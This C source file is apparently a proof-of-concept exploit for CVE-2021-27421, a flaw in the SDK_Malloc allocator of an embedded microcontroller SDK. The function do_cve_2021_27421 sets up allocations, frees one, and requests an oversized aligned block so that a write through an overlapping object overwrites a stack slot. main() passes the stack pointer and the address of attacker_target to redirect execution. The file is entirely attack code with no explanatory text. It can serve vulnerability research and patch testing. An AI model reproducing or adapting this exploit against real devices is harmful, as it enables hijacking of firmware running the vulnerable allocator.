#include <stdio.h>

#include "fsl_common.h"

struct item {
	int num;
	unsigned *ptr;
	unsigned blk[14];
};

void __attribute__((noinline))
do_cve_2021_27421(const void * target, void * slot)
{
	size_t nr_ancient = 0x8000, align_ancient = sizeof(struct item);
	size_t nr_old = 0x8000, align_old = sizeof(struct item);
	size_t nr_new = 0x3ffffc0, align_new = 0x10000;
	size_t offset;
	struct item * ancient = NULL;
	struct item * old = NULL;
	struct item * new = NULL;

	ancient = SDK_Malloc(nr_ancient * sizeof(struct item), align_ancient);
	if (ancient == NULL) {
		goto out;
	}

	old = SDK_Malloc(nr_old * sizeof(struct item), align_old);
	if (old == NULL) {
		goto out_free_ancient;
	}

	SDK_Free(ancient);
	ancient = NULL;

	new = SDK_Malloc(nr_new * sizeof(struct item), align_new);
	if (new == NULL) {
		goto out_free_old;
	}

	old[0].ptr = old[0].blk;

	offset = ((char *)old - (char *)new) / sizeof(struct item);
	if (offset < nr_new) {
		new[offset].ptr = (unsigned *)slot;
	}

	*old[0].ptr = (unsigned)target;

	SDK_Free(new);
	new = NULL;

out_free_old:
	if (old != NULL) {
		SDK_Free(old);
		old = NULL;
	}
out_free_ancient:
	if (ancient != NULL) {
		SDK_Free(ancient);
		ancient = NULL;
	}
out:
	return;
}

void __attribute__((noinline))
dummy(void)
{
	asm volatile ("");
}

register char * stack_ptr asm ("sp");

extern void attacker_target(void);

int __attribute__((noinline))
main(void)
{
	do_cve_2021_27421(&attacker_target, stack_ptr - 4);
	dummy();

	return 0;
}
